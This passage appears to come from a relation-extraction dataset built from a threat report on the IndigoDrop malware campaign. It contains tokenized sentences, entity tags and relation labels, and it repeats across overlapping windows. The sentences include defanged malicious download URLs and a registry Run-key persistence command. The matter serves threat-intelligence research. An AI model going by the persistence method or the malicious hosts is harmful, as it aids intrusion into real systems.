"from", "these", "remote", "locations", "(", "likely", "done", "in", "other", "variants", "of", "the", "attack", ")", "."], ["However", "this", "instance", "of", "the", "attack", "downloads", "a", "Metasploit", "shellcode", "from", "the", "hardcoded", "remote", "locations", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "EXE file", "pos": [7, 9], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "Startup directory", "pos": [17, 19], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [32, 32], "name": "payload IndigoDrop", "pos": [32, 34], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [43, 43], "name": "Startup directory", "pos": [43, 45], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [46, 46], "name": "macro", "pos": [46, 47], "index": "4_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [54, 54], "name": "payload", "pos": [54, 55], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [57, 57], "name": "attack", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [74, 74], "name": "payload", "pos": [18, 19], "index": "7_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [78, 78], "name": "endpoint", "pos": [22, 23], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [82, 82], "name": "payload", "pos": [2, 3], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [89, 89], "name": "dropper", "pos": [9, 10], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [99, 99], "name": "tasks", "pos": [19, 20], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [102, 102], "name": "macro code", "pos": [1, 3], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [109, 109], "name": "maldocs", "pos": [8, 9], "index": "13_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [118, 118], "name": "URL", "pos": [17, 18], "index": "14_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [132, 132], "name": "hxxp : //tecbeck.com/IAP39031.docx.It", "pos": [31, 34], "index": "15_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [140, 140], "name": "attackers", "pos": [39, 40], "index": "16_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [143, 143], "name": "maldocs", "pos": [42, 43], "index": "17_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [147, 147], "name": "server", "pos": [46, 47], "index": "18_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [153, 153], "name": "Bit.ly links", "pos": [52, 54], "index": "19_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [163, 163], "name": "emails", "pos": [62, 63], "index": "20_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [172, 172], "name": "binary", "pos": [7, 8], "index": "21_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [178, 178], "name": "maldocs", "pos": [13, 14], "index": "22_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [188, 188], "name": "IndigoDrop", "pos": [23, 24], "index": "23_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [197, 197], "name": "Cobalt Strike beacon", "pos": [32, 35], "index": "24_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [208, 208], "name": "location", "pos": [43, 44], "index": "25_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [212, 212], "name": "attack", "pos": [2, 3], "index": "26_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [214, 214], "name": "IndigoDrop", "pos": [4, 5], "index": "27_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [218, 218], "name": "remote locations", "pos": [8, 10], "index": "28_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [224, 224], "name": "platforms", "pos": [14, 15], "index": "29_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [233, 233], "name": "payloads", "pos": [23, 24], "index": "30_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [241, 241], "name": "dropper", "pos": [6, 7], "index": "31_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [246, 246], "name": "payload", "pos": [11, 12], "index": "32_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [249, 249], "name": "remote locations", "pos": [14, 16], "index": "33_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [267, 267], "name": "attack", "pos": [5, 6], "index": "34_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [270, 270], "name": "Metasploit shellcode", "pos": [8, 10], "index": "35_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [276, 276], "name": "locations", "pos": [14, 15], "index": "36_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 2, "h": 4}, {"r": "EX", "evidence": [0], "h": 4, "t": 5}, {"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0], "h": 2, "t": 3}, {"r": "EX", "evidence": [1], "h": 6, "t": 7}, {"r": "ST", "evidence": [1], "h": 6, "t": 8}, {"r": "RF", "evidence": [1], "h": 6, "t": 8}, {"r": "CO", "evidence": [1, 2], "h": 7, "t": 9}, {"r": "EX", "evidence": [2], "t": 9, "h": 10}, {"r": "FR", "evidence": [2], "h": 10, "t": 11}, {"r": "EX", "evidence": [3], "t": 12, "h": 13}, {"r": "ST", "evidence": [3], "h": 13, "t": 14}, {"r": "RF", "evidence": [3], "h": 13, "t": 14}, {"r": "ST", "evidence": [3], "h": 13, "t": 15}, {"r": "RF", "evidence": [3], "h": 13, "t": 15}, {"r": "FR", "evidence": [3], "h": 16, "t": 17}, {"r": "ST", "evidence": [3], "h": 16, "t": 18}, {"r": "RF", "evidence": [3], "h": 16, "t": 18}, {"r": "ST", "evidence": [3], "h": 16, "t": 19}, {"r": "RF", "evidence": [3], "h": 16, "t": 19}, {"r": "WR", "evidence": [3], "h": 16, "t": 20}, {"r": "WR", "evidence": [4], "t": 21, "h": 22}, {"r": "EX", "evidence": [4], "t": 21, "h": 23}, {"r": "WR", "evidence": [4], "h": 23, "t": 24}, {"r": "EX", "evidence": [4], "h": 23, "t": 24}, {"r": "ST", "evidence": [4], "h": 23, "t": 25}, {"r": "RF", "evidence": [4], "h": 23, "t": 25}, {"r": "FR", "evidence": [5], "h": 26, "t": 27}, {"r": "ST", "evidence": [5], "h": 27, "t": 28}, {"r": "RF", "evidence": [5], "h": 27, "t": 28}, {"r": "ST", "evidence": [5], "h": 27, "t": 29}, {"r": "RF", "evidence": [5], "h": 27, "t": 29}, {"r": "WR", "evidence": [5], "h": 27, "t": 30}, {"r": "CO", "evidence": [5, 6], "h": 27, "t": 31}, {"r": "WR", "evidence": [6], "h": 31, "t": 32}, {"r": "ST", "evidence": [6], "h": 31, "t": 33}, {"r": "RF", "evidence": [6], "h": 31, "t": 33}, {"r": "WR", "evidence": [7], "h": 34, "t": 35}, {"r": "ST", "evidence": [7], "h": 34, "t": 36}, {"r": "RF", "evidence": [7], "h": 34, "t": 36}]}, {"title": "643-13", "sents": [["The", "attack", "relies", "on", "the", "user", "either", "logging", "in", "again", "or", "restarting", "the", "system", "to", "activate", "the", "second-stage", "payload", "on", "the", "infected", "endpoint", "."], ["The", "second-stage", "payload", "in", "this", "attack", "is", "a", "custom", "dropper", "(", "IndigoDrop", ")", "that", "carries", "out", "a", "variety", "of", "tasks", "."], ["Malicious", "macro", "code", ":", "Maldoc", "distributionOne", "of", "the", "maldocs", "disclosed", "here", "was", "referred", "to", "by", "a", "Bit.ly-shortened", "URL", "(", "created", "Jan.", "23", ",", "2020", ")", "hxxp", ":", "//bit.ly/iaf-guidelines", "which", "redirects", "to", "hxxp", ":", "//tecbeck.com/IAP39031.docx.It", "is", "highly", "likely", "that", "the", "attackers", "hosted", "the", "maldocs", "on", "a", "public", "server", "and", "distributed", "the", "direct", "or", "Bit.ly", "links", "to", "the", "targets", "in", "the", "form", "of", "spear-phishing", "emails", "."], ["Stage", "2", ":", "Dropper", "binary", "IndigoDropThe", "second-stage", "binary", "dropped", "to", "disk", "by", "the", "maldocs", "is", "a", "malicious", "dropper/loader", "we", "'", "re", "calling", "``", "IndigoDrop", "''", "designed", "to", "download", "and", "activate", "a", "customized", "Cobalt", "Strike", "beacon", "(", "final", "payload", "DLL", ")", "from", "another", "remote", "location", "."], ["In", "this", "attack", ",", "IndigoDrop", "utilizes", "both", "attacker-operated", "remote", "locations", "and", "public", "data", "hosting", "platforms", "such", "as", "pastebin.com", "to", "host", "the", "next", "stage", "payloads", "."], ["It", "is", "highly", "likely", "that", "this", "dropper", "may", "download", "the", "final", "payload", "from", "these", "remote", "locations", "(", "likely", "done", "in", "other", "variants", "of", "the", "attack", ")", "."], ["However", "this", "instance", "of", "the", "attack", "downloads", "a", "Metasploit", "shellcode", "from", "the", "hardcoded", "remote", "locations", "."], ["The", "Metasploit", "shellcode", "(", "Stage", "2A", ")", "is", "hosted", "in", "the", "form", "of", "a", "Base64", "encoded", "string", "on", "the", "download", "locations", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "attack", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [18, 18], "name": "payload", "pos": [18, 19], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [22, 22], "name": "endpoint", "pos": [22, 23], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "payload", "pos": [2, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "dropper", "pos": [9, 10], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [43, 43], "name": "tasks", "pos": [19, 20], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [46, 46], "name": "macro code", "pos": [1, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [53, 53], "name": "maldocs", "pos": [8, 9], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [62, 62], "name": "URL", "pos": [17, 18], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [76, 76], "name": "hxxp : //tecbeck.com/IAP39031.docx.It", "pos": [31, 34], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [84, 84], "name": "attackers", "pos": [39, 40], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [87, 87], "name": "maldocs", "pos": [42, 43], "index": "11_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [91, 91], "name": "server", "pos": [46, 47], "index": "12_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [97, 97], "name": "Bit.ly links", "pos": [52, 54], "index": "13_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [107, 107], "name": "emails", "pos": [62, 63], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [116, 116], "name": "binary", "pos": [7, 8], "index": "15_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [122, 122], "name": "maldocs", "pos": [13, 14], "index": "16_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [132, 132], "name": "IndigoDrop", "pos": [23, 24], "index": "17_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [141, 141], "name": "Cobalt Strike beacon", "pos": [32, 35], "index": "18_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [152, 152], "name": "location", "pos": [43, 44], "index": "19_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [156, 156], "name": "attack", "pos": [2, 3], "index": "20_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [158, 158], "name": "IndigoDrop", "pos": [4, 5], "index": "21_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [162, 162], "name": "remote locations", "pos": [8, 10], "index": "22_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [168, 168], "name": "platforms", "pos": [14, 15], "index": "23_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [177, 177], "name": "payloads", "pos": [23, 24], "index": "24_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [185, 185], "name": "dropper", "pos": [6, 7], "index": "25_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [190, 190], "name": "payload", "pos": [11, 12], "index": "26_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [193, 193], "name": "remote locations", "pos": [14, 16], "index": "27_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [211, 211], "name": "attack", "pos": [5, 6], "index": "28_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [214, 214], "name": "Metasploit shellcode", "pos": [8, 10], "index": "29_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [220, 220], "name": "locations", "pos": [14, 15], "index": "30_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [223, 223], "name": "Metasploit shellcode", "pos": [1, 3], "index": "31_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [236, 236], "name": "Base64 encoded string", "pos": [14, 17], "index": "32_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [242, 242], "name": "locations", "pos": [20, 21], "index": "33_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "EX", "evidence": [1], "t": 3, "h": 4}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "EX", "evidence": [2], "t": 6, "h": 7}, {"r": "ST", "evidence": [2], "h": 7, "t": 8}, {"r": "RF", "evidence": [2], "h": 7, "t": 8}, {"r": "ST", "evidence": [2], "h": 7, "t": 9}, {"r": "RF", "evidence": [2], "h": 7, "t": 9}, {"r": "FR", "evidence": [2], "h": 10, "t": 11}, {"r": "ST", "evidence": [2], "h": 10, "t": 12}, {"r": "RF", "evidence": [2], "h": 10, "t": 12}, {"r": "ST", "evidence": [2], "h": 10, "t": 13}, {"r": "RF", "evidence": [2], "h": 10, "t": 13}, {"r": "WR", "evidence": [2], "h": 10, "t": 14}, {"r": "WR", "evidence": [3], "t": 15, "h": 16}, {"r": "EX", "evidence": [3], "t": 15, "h": 17}, {"r": "WR", "evidence": [3], "h": 17, "t": 18}, {"r": "EX", "evidence": [3], "h": 17, "t": 18}, {"r": "ST", "evidence": [3], "h": 17, "t": 19}, {"r": "RF", "evidence": [3], "h": 17, "t": 19}, {"r": "FR", "evidence": [4], "h": 20, "t": 21}, {"r": "ST", "evidence": [4], "h": 21, "t": 22}, {"r": "RF", "evidence": [4], "h": 21, "t": 22}, {"r": "ST", "evidence": [4], "h": 21, "t": 23}, {"r": "RF", "evidence": [4], "h": 21, "t": 23}, {"r": "WR", "evidence": [4], "h": 21, "t": 24}, {"r": "CO", "evidence": [4, 5], "h": 21, "t": 25}, {"r": "WR", "evidence": [5], "h": 25, "t": 26}, {"r": "ST", "evidence": [5], "h": 25, "t": 27}, {"r": "RF", "evidence": [5], "h": 25, "t": 27}, {"r": "WR", "evidence": [6], "h": 28, "t": 29}, {"r": "ST", "evidence": [6], "h": 28, "t": 30}, {"r": "RF", "evidence": [6], "h": 28, "t": 30}, {"r": "ST", "evidence": [6, 7], "h": 28, "t": 33}, {"r": "RF", "evidence": [6, 7], "h": 28, "t": 33}, {"r": "CO", "evidence": [6, 7], "h": 29, "t": 32}, {"r": "CO", "evidence": [6, 7], "h": 29, "t": 31}]}, {"title": "643-14", "sents": [["The", "second-stage", "payload", "in", "this", "attack", "is", "a", "custom", "dropper", "(", "IndigoDrop", ")", "that", "carries", "out", "a", "variety", "of", "tasks", "."], ["Malicious", "macro", "code", ":", "Maldoc", "distributionOne", "of", "the", "maldocs", "disclosed", "here", "was", "referred", "to", "by", "a", "Bit.ly-shortened", "URL", "(", "created", "Jan.", "23", ",", "2020", ")", "hxxp", ":", "//bit.ly/iaf-guidelines", "which", "redirects", "to", "hxxp", ":", "//tecbeck.com/IAP39031.docx.It", "is", "highly", "likely", "that", "the", "attackers", "hosted", "the", "maldocs", "on", "a", "public", "server", "and", "distributed", "the", "direct", "or", "Bit.ly", "links", "to", "the", "targets", "in", "the", "form", "of", "spear-phishing", "emails", "."], ["Stage", "2", ":", "Dropper", "binary", "IndigoDropThe", "second-stage", "binary", "dropped", "to", "disk", "by", "the", "maldocs", "is", "a", "malicious", "dropper/loader", "we", "'", "re", "calling", "``", "IndigoDrop", "''", "designed", "to", "download", "and", "activate", "a", "customized", "Cobalt", "Strike", "beacon", "(", "final", "payload", "DLL", ")", "from", "another", "remote", "location", "."], ["In", "this", "attack", ",", "IndigoDrop", "utilizes", "both", "attacker-operated", "remote", "locations", "and", "public", "data", "hosting", "platforms", "such", "as", "pastebin.com", "to", "host", "the", "next", "stage", "payloads", "."], ["It", "is", "highly", "likely", "that", "this", "dropper", "may", "download", "the", "final", "payload", "from", "these", "remote", "locations", "(", "likely", "done", "in", "other", "variants", "of", "the", "attack", ")", "."], ["However", "this", "instance", "of", "the", "attack", "downloads", "a", "Metasploit", "shellcode", "from", "the", "hardcoded", "remote", "locations", "."], ["The", "Metasploit", "shellcode", "(", "Stage", "2A", ")", "is", "hosted", "in", "the", "form", "of", "a", "Base64", "encoded", "string", "on", "the", "download", "locations", "."], ["This", "shellcode", "is", "base64", "decoded", ",", "unhexlified", "and", "executed", "on", "the", "endpoint", "as", "part", "of", "IndigoDrop", "'", "s", "execution", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "payload", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "dropper", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [19, 19], "name": "tasks", "pos": [19, 20], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [22, 22], "name": "macro code", "pos": [1, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "maldocs", "pos": [8, 9], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [38, 38], "name": "URL", "pos": [17, 18], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [52, 52], "name": "hxxp : //tecbeck.com/IAP39031.docx.It", "pos": [31, 34], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [60, 60], "name": "attackers", "pos": [39, 40], "index": "7_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [63, 63], "name": "maldocs", "pos": [42, 43], "index": "8_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [67, 67], "name": "server", "pos": [46, 47], "index": "9_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [73, 73], "name": "Bit.ly links", "pos": [52, 54], "index": "10_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [83, 83], "name": "emails", "pos": [62, 63], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [92, 92], "name": "binary", "pos": [7, 8], "index": "12_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [98, 98], "name": "maldocs", "pos": [13, 14], "index": "13_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [108, 108], "name": "IndigoDrop", "pos": [23, 24], "index": "14_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [117, 117], "name": "Cobalt Strike beacon", "pos": [32, 35], "index": "15_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [128, 128], "name": "location", "pos": [43, 44], "index": "16_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [132, 132], "name": "attack", "pos": [2, 3], "index": "17_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [134, 134], "name": "IndigoDrop", "pos": [4, 5], "index": "18_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [138, 138], "name": "remote locations", "pos": [8, 10], "index": "19_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [144, 144], "name": "platforms", "pos": [14, 15], "index": "20_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [153, 153], "name": "payloads", "pos": [23, 24], "index": "21_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [161, 161], "name": "dropper", "pos": [6, 7], "index": "22_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [166, 166], "name": "payload", "pos": [11, 12], "index": "23_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [169, 169], "name": "remote locations", "pos": [14, 16], "index": "24_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [187, 187], "name": "attack", "pos": [5, 6], "index": "25_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [190, 190], "name": "Metasploit shellcode", "pos": [8, 10], "index": "26_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [196, 196], "name": "locations", "pos": [14, 15], "index": "27_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [199, 199], "name": "Metasploit shellcode", "pos": [1, 3], "index": "28_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [212, 212], "name": "Base64 encoded string", "pos": [14, 17], "index": "29_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [218, 218], "name": "locations", "pos": [20, 21], "index": "30_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [221, 221], "name": "shellcode", "pos": [1, 2], "index": "31_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [231, 231], "name": "endpoint", "pos": [11, 12], "index": "32_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [235, 235], "name": "IndigoDrop '", "pos": [15, 17], "index": "33_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "EX", "evidence": [1], "t": 3, "h": 4}, {"r": "ST", "evidence": [1], "h": 4, "t": 5}, {"r": "RF", "evidence": [1], "h": 4, "t": 5}, {"r": "ST", "evidence": [1], "h": 4, "t": 6}, {"r": "RF", "evidence": [1], "h": 4, "t": 6}, {"r": "FR", "evidence": [1], "h": 7, "t": 8}, {"r": "ST", "evidence": [1], "h": 7, "t": 9}, {"r": "RF", "evidence": [1], "h": 7, "t": 9}, {"r": "ST", "evidence": [1], "h": 7, "t": 10}, {"r": "RF", "evidence": [1], "h": 7, "t": 10}, {"r": "WR", "evidence": [1], "h": 7, "t": 11}, {"r": "WR", "evidence": [2], "t": 12, "h": 13}, {"r": "EX", "evidence": [2], "t": 12, "h": 14}, {"r": "WR", "evidence": [2], "h": 14, "t": 15}, {"r": "EX", "evidence": [2], "h": 14, "t": 15}, {"r": "ST", "evidence": [2], "h": 14, "t": 16}, {"r": "RF", "evidence": [2], "h": 14, "t": 16}, {"r": "FR", "evidence": [3], "h": 17, "t": 18}, {"r": "ST", "evidence": [3], "h": 18, "t": 19}, {"r": "RF", "evidence": [3], "h": 18, "t": 19}, {"r": "ST", "evidence": [3], "h": 18, "t": 20}, {"r": "RF", "evidence": [3], "h": 18, "t": 20}, {"r": "WR", "evidence": [3], "h": 18, "t": 21}, {"r": "CO", "evidence": [3, 4], "h": 18, "t": 22}, {"r": "WR", "evidence": [4], "h": 22, "t": 23}, {"r": "ST", "evidence": [4], "h": 22, "t": 24}, {"r": "RF", "evidence": [4], "h": 22, "t": 24}, {"r": "WR", "evidence": [5], "h": 25, "t": 26}, {"r": "ST", "evidence": [5], "h": 25, "t": 27}, {"r": "RF", "evidence": [5], "h": 25, "t": 27}, {"r": "ST", "evidence": [5, 6], "h": 25, "t": 30}, {"r": "RF", "evidence": [5, 6], "h": 25, "t": 30}, {"r": "CO", "evidence": [5, 6], "h": 26, "t": 29}, {"r": "CO", "evidence": [5, 6], "h": 26, "t": 28}, {"r": "CO", "evidence": [5, 6, 7], "h": 26, "t": 31}, {"r": "EX", "evidence": [7], "t": 31, "h": 33}, {"r": "ST", "evidence": [7], "t": 32, "h": 33}, {"r": "RF", "evidence": [7], "t": 32, "h": 33}]}, {"title": "643-15", "sents": [["Malicious", "macro", "code", ":", "Maldoc", "distributionOne", "of", "the", "maldocs", "disclosed", "here", "was", "referred", "to", "by", "a", "Bit.ly-shortened", "URL", "(", "created", "Jan.", "23", ",", "2020", ")", "hxxp", ":", "//bit.ly/iaf-guidelines", "which", "redirects", "to", "hxxp", ":", "//tecbeck.com/IAP39031.docx.It", "is", "highly", "likely", "that", "the", "attackers", "hosted", "the", "maldocs", "on", "a", "public", "server", "and", "distributed", "the", "direct", "or", "Bit.ly", "links", "to", "the", "targets", "in", "the", "form", "of", "spear-phishing", "emails", "."], ["Stage", "2", ":", "Dropper", "binary", "IndigoDropThe", "second-stage", "binary", "dropped", "to", "disk", "by", "the", "maldocs", "is", "a", "malicious", "dropper/loader", "we", "'", "re", "calling", "``", "IndigoDrop", "''", "designed", "to", "download", "and", "activate", "a", "customized", "Cobalt", "Strike", "beacon", "(", "final", "payload", "DLL", ")", "from", "another", "remote", "location", "."], ["In", "this", "attack", ",", "IndigoDrop", "utilizes", "both", "attacker-operated", "remote", "locations", "and", "public", "data", "hosting", "platforms", "such", "as", "pastebin.com", "to", "host", "the", "next", "stage", "payloads", "."], ["It", "is", "highly", "likely", "that", "this", "dropper", "may", "download", "the", "final", "payload", "from", "these", "remote", "locations", "(", "likely", "done", "in", "other", "variants", "of", "the", "attack", ")", "."], ["However", "this", "instance", "of", "the", "attack", "downloads", "a", "Metasploit", "shellcode", "from", "the", "hardcoded", "remote", "locations", "."], ["The", "Metasploit", "shellcode", "(", "Stage", "2A", ")", "is", "hosted", "in", "the", "form", "of", "a", "Base64", "encoded", "string", "on", "the", "download", "locations", "."], ["This", "shellcode", "is", "base64", "decoded", ",", "unhexlified", "and", "executed", "on", "the", "endpoint", "as", "part", "of", "IndigoDrop", "'", "s", "execution", "."], ["Base64-encoded", "Metasploit", "shellcode", ":", "Base64-decoded", "Metasploit", "shellcode", ":", "IndigoDrop", "analysisThis", "dropper", "performs", "the", "following", "actions", "on", "the", "endpoint", ":", "Establish", "persistence", "using", "the", "registry", "Run", "key", "for", "itself", "in", "location", ":", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "|", "iexplorer", "=", "cmd", "/c", "<", "file_path_of_Dropper", ">", "/onboot", "-hideE.g", ".", "Download", "and", "execute", "the", "Stage", "2A", "Metasploit", "shellcode", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "macro code", "pos": [1, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "maldocs", "pos": [8, 9], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [17, 17], "name": "URL", "pos": [17, 18], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [31, 31], "name": "hxxp : //tecbeck.com/IAP39031.docx.It", "pos": [31, 34], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [39, 39], "name": "attackers", "pos": [39, 40], "index": "4_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [42, 42], "name": "maldocs", "pos": [42, 43], "index": "5_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [46, 46], "name": "server", "pos": [46, 47], "index": "6_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [52, 52], "name": "Bit.ly links", "pos": [52, 54], "index": "7_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [62, 62], "name": "emails", "pos": [62, 63], "index": "8_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [71, 71], "name": "binary", "pos": [7, 8], "index": "9_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [77, 77], "name": "maldocs", "pos": [13, 14], "index": "10_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [87, 87], "name": "IndigoDrop", "pos": [23, 24], "index": "11_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [96, 96], "name": "Cobalt Strike beacon", "pos": [32, 35], "index": "12_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [107, 107], "name": "location", "pos": [43, 44], "index": "13_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [111, 111], "name": "attack", "pos": [2, 3], "index": "14_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [113, 113], "name": "IndigoDrop", "pos": [4, 5], "index": "15_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [117, 117], "name": "remote locations", "pos": [8, 10], "index": "16_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [123, 123], "name": "platforms", "pos": [14, 15], "index": "17_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [132, 132], "name": "payloads", "pos": [23, 24], "index": "18_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [140, 140], "name": "dropper", "pos": [6, 7], "index": "19_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [145, 145], "name": "payload", "pos": [11, 12], "index": "20_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [148, 148], "name": "remote locations", "pos": [14, 16], "index": "21_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [166, 166], "name": "attack", "pos": [5, 6], "index": "22_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [169, 169], "name": "Metasploit shellcode", "pos": [8, 10], "index": "23_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [175, 175], "name": "locations", "pos": [14, 15], "index": "24_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [178, 178], "name": "Metasploit shellcode", "pos": [1, 3], "index": "25_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [191, 191], "name": "Base64 encoded string", "pos": [14, 17], "index": "26_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [197, 197], "name": "locations", "pos": [20, 21], "index": "27_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [200, 200], "name": "shellcode", "pos": [1, 2], "index": "28_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [210, 210], "name": "endpoint", "pos": [11, 12], "index": "29_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [214, 214], "name": "IndigoDrop '", "pos": [15, 17], "index": 